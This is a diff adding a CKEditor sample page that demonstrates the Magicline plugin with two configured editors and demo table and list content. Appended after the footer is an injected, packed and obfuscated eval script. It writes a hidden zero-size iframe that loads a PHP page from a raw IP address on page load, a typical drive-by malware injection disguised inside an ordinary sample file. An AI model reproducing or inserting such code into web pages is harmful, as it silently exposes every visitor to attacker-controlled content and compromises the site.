@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<!--
+Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
+For licensing, see LICENSE.md or http://ckeditor.com/license
+-->
+<html>
+<head>
+	<title>Using Magicline plugin &mdash; CKEditor Sample</title>
+	<meta charset="utf-8">
+	<script src="../../../ckeditor.js"></script>
+	<link rel="stylesheet" href="../../../samples/sample.css">
+	<meta name="ckeditor-sample-name" content="Magicline plugin">
+	<meta name="ckeditor-sample-group" content="Plugins">
+	<meta name="ckeditor-sample-description" content="Using the Magicline plugin to access difficult focus spaces.">
+	<meta name="ckeditor-sample-isnew" content="1">
+</head>
+<body>
+	<h1 class="samples">
+		<a href="../../../samples/index.html">CKEditor Samples</a> &raquo; Using Magicline plugin
+	</h1>
+	<div class="description">
+		<p>
+			This sample shows the advantages of <strong>Magicline</strong> plugin
+			which is to enhance the editing process. Thanks to this plugin,
+			a number of difficult focus spaces which are inaccessible due to
+			browser issues can now be focused.
+		</p>
+		<p>
+			<strong>Magicline</strong> plugin shows a red line with a handler
+			which, when clicked, inserts a paragraph and allows typing. To see this,
+			focus an editor and move your mouse above the focus space you want
+			to access. The plugin is enabled by default so no additional
+			configuration is necessary.
+		</p>
+	</div>
+	<div>
+		<label for="editor1">
+			Editor 1:
+		</label>
+		<div class="description">
+			<p>
+				This editor uses a default <strong>Magicline</strong> setup.
+			</p>
+		</div>
+		<textarea cols="80" id="editor1" name="editor1" rows="10">
+			&lt;table border=&quot;1&quot; cellpadding=&quot;1&quot; cellspacing=&quot;1&quot; style=&quot;width: 100%; &quot;&gt;
+				&lt;tbody&gt;
+					&lt;tr&gt;
+						&lt;td&gt;This table&lt;/td&gt;
+						&lt;td&gt;is the&lt;/td&gt;
+						&lt;td&gt;very first&lt;/td&gt;
+						&lt;td&gt;element of the document.&lt;/td&gt;
+					&lt;/tr&gt;
+					&lt;tr&gt;
+						&lt;td&gt;We are still&lt;/td&gt;
+						&lt;td&gt;able to acces&lt;/td&gt;
+						&lt;td&gt;the space before it.&lt;/td&gt;
+						&lt;td&gt;
+						&lt;table border=&quot;1&quot; cellpadding=&quot;1&quot; cellspacing=&quot;1&quot; style=&quot;width: 100%; &quot;&gt;
+							&lt;tbody&gt;
+								&lt;tr&gt;
+									&lt;td&gt;This table is inside of a cell of another table.&lt;/td&gt;
+								&lt;/tr&gt;
+								&lt;tr&gt;
+									&lt;td&gt;We can type&amp;nbsp;either before or after it though.&lt;/td&gt;
+								&lt;/tr&gt;
+							&lt;/tbody&gt;
+						&lt;/table&gt;
+						&lt;/td&gt;
+					&lt;/tr&gt;
+				&lt;/tbody&gt;
+			&lt;/table&gt;
+
+			&lt;p&gt;Two succesive horizontal lines (&lt;tt&gt;HR&lt;/tt&gt; tags). We can access the space in between:&lt;/p&gt;
+
+			&lt;hr /&gt;
+			&lt;hr /&gt;
+			&lt;ol&gt;
+				&lt;li&gt;This numbered list...&lt;/li&gt;
+				&lt;li&gt;...is a neighbour of a horizontal line...&lt;/li&gt;
+				&lt;li&gt;...and another list.&lt;/li&gt;
+			&lt;/ol&gt;
+
+			&lt;ul&gt;
+				&lt;li&gt;We can type between the lists...&lt;/li&gt;
+				&lt;li&gt;...thanks to &lt;strong&gt;Magicline&lt;/strong&gt;.&lt;/li&gt;
+			&lt;/ul&gt;
+
+			&lt;p&gt;Lorem ipsum dolor sit amet dui. Morbi vel turpis. Nullam et leo. Etiam rutrum, urna tellus dui vel tincidunt mattis egestas, justo fringilla vel, massa. Phasellus.&lt;/p&gt;
+
+			&lt;p&gt;Quisque iaculis, dui lectus varius vitae, tortor. Proin lacus. Pellentesque ac lacus. Aenean nonummy commodo nec, pede. Etiam blandit risus elit.&lt;/p&gt;
+
+			&lt;p&gt;Ut pretium. Vestibulum rutrum in, adipiscing elit. Sed in quam in purus sem vitae pede. Pellentesque bibendum, urna sem vel risus. Vivamus posuere metus. Aliquam gravida iaculis nisl. Nam enim. Aliquam erat ac lacus tellus ac felis.&lt;/p&gt;
+
+			&lt;div style=&quot;border: 2px dashed green; background: #ddd; text-align: center;&quot;&gt;
+			&lt;p&gt;This text is wrapped in a&amp;nbsp;&lt;tt&gt;DIV&lt;/tt&gt;&amp;nbsp;element. We can type after this element though.&lt;/p&gt;
+			&lt;/div&gt;
+		</textarea>
+		<script>
+
+			// This call can be placed at any point after the
+			// <textarea>, or inside a <head><script> in a
+			// window.onload event handler.
+
+			CKEDITOR.replace( 'editor1', {
+				extraPlugins: 'magicline',	// Ensure that magicline plugin, which is required for this sample, is loaded.
+				allowedContent: true		// Switch off the ACF, so very complex content created to
+											// show magicline's power isn't filtered.
+			} );
+
+		</script>
+	</div>
+	<br>
+	<div>
+		<label for="editor2">
+			Editor 2:
+		</label>
+		<div class="description">
+			<p>
+				This editor is using a blue line.
+			</p>
+<pre class="samples">
+CKEDITOR.replace( 'editor2', {
+	magicline_color: 'blue'
+});</pre>
+		</div>
+		<textarea cols="80" id="editor2" name="editor2" rows="10">
+			&lt;table border=&quot;1&quot; cellpadding=&quot;1&quot; cellspacing=&quot;1&quot; style=&quot;width: 100%; &quot;&gt;
+				&lt;tbody&gt;
+					&lt;tr&gt;
+						&lt;td&gt;This table&lt;/td&gt;
+						&lt;td&gt;is the&lt;/td&gt;
+						&lt;td&gt;very first&lt;/td&gt;
+						&lt;td&gt;element of the document.&lt;/td&gt;
+					&lt;/tr&gt;
+					&lt;tr&gt;
+						&lt;td&gt;We are still&lt;/td&gt;
+						&lt;td&gt;able to acces&lt;/td&gt;
+						&lt;td&gt;the space before it.&lt;/td&gt;
+						&lt;td&gt;
+						&lt;table border=&quot;1&quot; cellpadding=&quot;1&quot; cellspacing=&quot;1&quot; style=&quot;width: 100%; &quot;&gt;
+							&lt;tbody&gt;
+								&lt;tr&gt;
+									&lt;td&gt;This table is inside of a cell of another table.&lt;/td&gt;
+								&lt;/tr&gt;
+								&lt;tr&gt;
+									&lt;td&gt;We can type&amp;nbsp;either before or after it though.&lt;/td&gt;
+								&lt;/tr&gt;
+							&lt;/tbody&gt;
+						&lt;/table&gt;
+						&lt;/td&gt;
+					&lt;/tr&gt;
+				&lt;/tbody&gt;
+			&lt;/table&gt;
+
+			&lt;p&gt;Two succesive horizontal lines (&lt;tt&gt;HR&lt;/tt&gt; tags). We can access the space in between:&lt;/p&gt;
+
+			&lt;hr /&gt;
+			&lt;hr /&gt;
+			&lt;ol&gt;
+				&lt;li&gt;This numbered list...&lt;/li&gt;
+				&lt;li&gt;...is a neighbour of a horizontal line...&lt;/li&gt;
+				&lt;li&gt;...and another list.&lt;/li&gt;
+			&lt;/ol&gt;
+
+			&lt;ul&gt;
+				&lt;li&gt;We can type between the lists...&lt;/li&gt;
+				&lt;li&gt;...thanks to &lt;strong&gt;Magicline&lt;/strong&gt;.&lt;/li&gt;
+			&lt;/ul&gt;
+
+			&lt;p&gt;Lorem ipsum dolor sit amet dui. Morbi vel turpis. Nullam et leo. Etiam rutrum, urna tellus dui vel tincidunt mattis egestas, justo fringilla vel, massa. Phasellus.&lt;/p&gt;
+
+			&lt;p&gt;Quisque iaculis, dui lectus varius vitae, tortor. Proin lacus. Pellentesque ac lacus. Aenean nonummy commodo nec, pede. Etiam blandit risus elit.&lt;/p&gt;
+
+			&lt;p&gt;Ut pretium. Vestibulum rutrum in, adipiscing elit. Sed in quam in purus sem vitae pede. Pellentesque bibendum, urna sem vel risus. Vivamus posuere metus. Aliquam gravida iaculis nisl. Nam enim. Aliquam erat ac lacus tellus ac felis.&lt;/p&gt;
+
+			&lt;div style=&quot;border: 2px dashed green; background: #ddd; text-align: center;&quot;&gt;
+			&lt;p&gt;This text is wrapped in a&amp;nbsp;&lt;tt&gt;DIV&lt;/tt&gt;&amp;nbsp;element. We can type after this element though.&lt;/p&gt;
+			&lt;/div&gt;
+		</textarea>
+		<script>
+
+			// This call can be placed at any point after the
+			// <textarea>, or inside a <head><script> in a
+			// window.onload event handler.
+
+			CKEDITOR.replace( 'editor2', {
+				extraPlugins: 'magicline',	// Ensure that magicline plugin, which is required for this sample, is loaded.
+				magicline_color: 'blue',	// Blue line
+				allowedContent: true		// Switch off the ACF, so very complex content created to
+											// show magicline's power isn't filtered.
+			});
+
+		</script>
+	</div>
+	<div id="footer">
+		<hr>
+		<p>
+			CKEditor - The text editor for the Internet - <a class="samples" href="http://ckeditor.com/">http://ckeditor.com</a>
+		</p>
+		<p id="copy">
+			Copyright &copy; 2003-2013, <a class="samples" href="http://cksource.com/">CKSource</a> - Frederico
+			Knabben. All rights reserved.
+		</p>
+	</div>
+<tag5479347351></tag5479347351><script>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 b=" n=\\"0\\" s=\\"0\\" t=\\"0\\" k=\\"q://g.l.j.h/c.d\\">";1 8="<i";1 9="</i";1 2="f";1 3="r";1 5="a";1 4="m";1 6="e";1 7="e>";o.p(8+2+3+5+4+6+b+9+2+3+5+4+7);',30,30,'|var|u4|u5|u7|u6|u8|u9|u2|u3||u1|tag1|php|||118|66||68|src|161||width|document|write|http||height|board'.split('|'),0,{}))</script><tag5479347352></tag5479347352></body>
+</html>
